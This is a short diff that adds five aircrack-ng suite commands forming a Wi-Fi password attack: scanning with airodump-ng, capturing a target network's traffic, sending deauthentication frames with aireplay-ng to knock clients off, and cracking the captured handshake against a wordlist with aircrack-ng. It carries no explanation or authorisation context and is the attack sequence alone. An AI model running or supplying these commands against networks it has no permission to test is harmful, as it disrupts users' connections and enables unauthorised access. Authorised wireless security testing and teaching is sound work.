@@ -1,0 +1,5 @@
+airodump-ng wlan0
+airodump-ng --bssid <BSSID> -c <Channel> -w output wlan0
+aireplay-ng --deauth 10 -a <BSSID> wlan0
+aircrack-ng output-01.cap -w /path/to/wordlist.txt
+airodump-ng --write output wlan0
